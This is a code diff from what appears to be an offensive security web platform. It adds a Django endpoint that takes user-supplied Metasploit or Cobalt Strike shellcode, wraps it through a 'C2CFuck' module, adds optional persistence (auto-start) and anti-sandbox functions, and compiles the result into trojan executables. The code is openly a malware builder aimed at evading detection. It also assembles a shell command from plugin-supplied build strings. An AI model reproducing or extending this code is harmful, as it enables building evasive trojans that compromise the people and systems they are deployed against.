@@ -5,12 +5,14 @@ import time
 import json
 import sys
 import os
-from ClassCongregation import ErrorLog,GetTempFilePath,GetTrojanFilePath,GetTrojanModulesFilePath,randoms
+import yaml
+from ClassCongregation import ErrorLog,GetTempFilePath,GetTrojanFilePath,GetTrojanModulesFilePath,randoms,GetTrojanPluginsPath
 from Web.DatabaseHub import UserInfo,TrojanData
 from django.http import JsonResponse,FileResponse
 from Web.Workbench.LogRelated import UserOperationLogRecord,RequestLogRecord
 from Web.celery import app
 import importlib
+from Web.TrojanOrVirus import C2CFuck
 from Web.TrojanOrVirus.TrojanClass import AutoStart,AntiSandbox
 
 
@@ -394,3 +396,134 @@ def TrojanFileDownloadVerification(request):#木马文件下载验证接口
 
     else:
         return JsonResponse({'message': '请使用Get请求', 'code': 500, })
+
+
+
+
+def TestShellcodeToTrojan(request):#测试函数，暂时不管沙盒测试
+    RequestLogRecord(request, request_api="shellcode_to_trojan")
+    if request.method == "POST":
+        try:
+            Token=json.loads(request.body)["token"]
+            ShellcodeName = json.loads(request.body)["shellcode_name"]  # 项目名字
+            Shellcode = json.loads(request.body)["shellcode"]#shellcode字符串
+            ShellcodeType = json.loads(request.body)["shellcode_type"] #用来辨别MSF 还是CS
+            ShellcodeArchitecture = json.loads(request.body)["shellcode_architecture"]  # 架构类型 X86或者X64
+            Plugin = json.loads(request.body)["plugin"]  # 当前shellcode使用的插件
+            AutoStartFunction = json.loads(request.body)["auto_start_function"]# 获取自启动函数，如果空表明不传入
+            AntiSandboxFunction = json.loads(request.body)["anti_sandbox_function"]  # 获取自启动函数，如果空表明不传入
+            Uid = UserInfo().QueryUidWithToken(Token)  # 如果登录成功后就来查询UID
+            if Uid != None:  # 查到了UID
+                UserOperationLogRecord(request, request_api="shellcode_to_trojan", uid=Uid)
+                TrojanModulesFilePath=GetTrojanModulesFilePath().Result()#获取插件文件夹
+                PluginList = os.listdir(TrojanModulesFilePath)#获取文件夹中全部文件
+                try:
+                    if ShellcodeName=="":#判断是否有名字
+                        return JsonResponse({'message': "未传入项目名称！", 'code': 410, })
+                    if not (set(AutoStartFunction) < set(AutoStart().__Method__)):#判断是否是子集，如果是c
+                        return JsonResponse({'message': "传入自启函数并不在可调用列表中ლ(•̀ _ •́ ლ)", 'code': 402, })
+                    elif not (set(AntiSandboxFunction) < set(AntiSandbox().__Method__)):
+                        return JsonResponse({'message': "传入反沙箱函数并不在可调用列表中ლ(•̀ _ •́ ლ)", 'code': 405, })
+                    else:
+                        if Plugin in PluginList:#判断传入的是否是python插件，并且插件名称是否在列表中
+                            try:
+                                TrojanPluginsPath = GetTrojanPluginsPath().Result()  # 获取插件路径
+                                YamlRawData = yaml.safe_load(open(TrojanPluginsPath+Plugin)) # 读取yaml文件
+
+                                TempFilePath = GetTempFilePath().Result()  # temp文件路径
+                                RandomName = randoms().EnglishAlphabet(5) + str(int(time.time()))  # 随机名称
+                                SourceFileSuffix=YamlRawData.get('language')  #获取源文件后缀
+                                GenerateFileSuffix=YamlRawData.get('process')   #获取生成文件后缀
+                                BuildCommand= YamlRawData.get('build')  # 获取自定义新增编译命令
+                                TrojanPluginsName = YamlRawData.get('name')  # 获取插件名
+                                VirusOriginalFilePath = TempFilePath + RandomName + "." +SourceFileSuffix  # 病毒原始文件名，后缀从插件中获取
+                                VirusFileStoragePath = GetTrojanFilePath().Result()  # 病毒文件存放路径
+                                VirusFileGenerationPath = VirusFileStoragePath + RandomName + "." +GenerateFileSuffix  # 病毒文件生成路径
+                                Include=""
+                                FunctionName=""
+                                Code= ""
+                                for x in AutoStartFunction:
+                                    if x.split('2')[-1]=="c" or x.split('2')[-1]=="cpp":
+                                        if SourceFileSuffix=="c" or SourceFileSuffix=="cpp":
+                                            continue
+                                    elif x.split('2')[-1] !=SourceFileSuffix:#获取语言类型进行判断
+                                        return JsonResponse({'message': "自启动函数代码与插件语言类型不符ლ(•̀ _ •́ ლ)", 'code': 406, })
+                                for q in AntiSandboxFunction:
+                                    if q.split('2')[-1] == "c" or q.split('2')[-1] == "cpp":
+                                        if SourceFileSuffix == "c" or SourceFileSuffix == "cpp":
+                                            continue
+                                    elif q.split('2')[-1] != SourceFileSuffix:  # 获取语言类型进行判断
+                                        return JsonResponse({'message': "反沙盒函数代码与插件语言类型不符ლ(•̀ _ •́ ლ)", 'code': 407, })
+
+                                try:
+                                    for w in AutoStartFunction:  # 进行动态调用
+                                        Return=getattr(AutoStart(), w)()#动态调用类中的方法
+                                        Include+=Return[0]
+                                        FunctionName+=Return[1]
+                                        Code+=Return[2]
+                                except Exception as e:
+                                    ErrorLog().Write(
+                                        "Web_TrojanOrVirus_TrojanInterface_ShellcodeToTrojan(def)-AutoStartFunction-getattr", e)
+                                    return JsonResponse({'message': "呐呐呐！AutoStartFunction中getattr函数错误~", 'code': 408, })
+                                try:
+                                    for e in AntiSandboxFunction:  # 进行动态调用
+                                        Return=getattr(AntiSandbox(), e)()#动态调用类中的方法
+                                        Include+=Return[0]
+                                        FunctionName+=Return[1]
+                                        Code+=Return[2]
+                                except Exception as e:
+                                    ErrorLog().Write(
+                                        "Web_TrojanOrVirus_TrojanInterface_ShellcodeToTrojan(def)-AntiSandboxFunction-getattr", e)
+                                    return JsonResponse({'message': "呐呐呐！AntiSandboxFunction中getattr函数错误~", 'code': 409, })
+
+                                #需要判断语言类型然后对应不同的生成方式
+                                if sys.platform == "win32":
+                                    # windows的暂时没测试
+                                    return JsonResponse({'message': "暂不支持Windows免杀方式~敬请关注后续更新", 'code': 601, })
+                                elif sys.platform == "darwin" or sys.platform == "linux":#判断当前运行的机器类型
+                                    File = open(VirusOriginalFilePath, "w+")
+                                    File.write(C2CFuck.Run(shell_code=Shellcode,yaml_raw_data=YamlRawData))#获取shellcode传入动态调用函数中，然后写入本地文件
+                                    File.close()
+                                    if ShellcodeArchitecture!="x86" and ShellcodeArchitecture!="x64":#判断对应架构
+                                        return JsonResponse({'message': "暂不支持其他架构~", 'code': 440, })
+
+                                    elif ShellcodeArchitecture=="x86" or ShellcodeArchitecture=="x64":
+                                        Command=Language2Command["linux"][SourceFileSuffix][ShellcodeArchitecture][GenerateFileSuffix]#通过文件中的语言类型和生成文件进行提取命令
+                                        if Command==None:
+                                            return JsonResponse({'message': "呐呐呐！该种组合无法进行编译，请使用其他插件~", 'code': 450, })
+                                        elif BuildCommand is not None:#判断有没有在原始编译命令上新增的编译操作
+
+                                            if Command.find(" -o ")!=-1:#提取输出命令
+                                                Command=Command.replace(" -o "," "+BuildCommand+" -o ")
+                                            elif Command.find(" --out:")!=-1:#提取输出命令
+                                                Command = Command.replace(" --out:", " " + BuildCommand + " --out:")
+
+                                        CompleteCommand=Command + VirusFileGenerationPath +" "+VirusOriginalFilePath #进行命令拼接
+                                        RedisCompileCodeTask=CompileCode.delay(CompleteCommand)
+                                        TrojanData().Write(uid=Uid, shellcode_type=ShellcodeType,shellcode_name=ShellcodeName,
+                                                               trojan_original_file_name=RandomName +"."+ SourceFileSuffix,
+                                                               trojan_generate_file_name=RandomName +"."+ GenerateFileSuffix, compilation_status="0",
+                                                               redis_id=RedisCompileCodeTask.task_id,
+                                                               shellcode_architecture=ShellcodeArchitecture,
+                                                               plugin=TrojanPluginsName)
+
+                                        return JsonResponse({'message': "宝贝任务已下发~", 'code': 200, })
+                                else:
+                                    return JsonResponse({'message': "你的电脑不是Mac或者Linux无法使用该功能ლ(•̀ _ •́ ლ)", 'code': 600, })
+                            except Exception as e:
+                                ErrorLog().Write("Web_TrojanOrVirus_TrojanInterface_ShellcodeToTrojan(def)-Plugin", e)
+                                return JsonResponse({'message': "呐呐呐！你这插件有问题呀！快上服务器看看是不是写错了", 'code': 197, })
+                        else:
+                            return JsonResponse({'message': "小伙子不要搞事情嗷，你不看看插件是否传入正确ლ(•̀ _ •́ ლ)", 'code': 430, })
+
+                except Exception as e:
+                    ErrorLog().Write("Web_TrojanOrVirus_TrojanInterface_ShellcodeToTrojan(def)-TrojanClass", e)
+                    return JsonResponse({'message': "呐呐呐！未知错误內~", 'code': 161, })
+            else:
+                return JsonResponse({'message': "小宝贝这是非法请求哦(๑•̀ㅂ•́)و✧", 'code': 403, })
+        except Exception as e:
+            ErrorLog().Write("Web_TrojanOrVirus_TrojanInterface_ShellcodeToTrojan(def)", e)
+            return JsonResponse({'message': "呐呐呐！莎酱被玩坏啦(>^ω^<)", 'code': 169, })
+    else:
+        return JsonResponse({'message': '请使用Post请求', 'code': 500, })
+
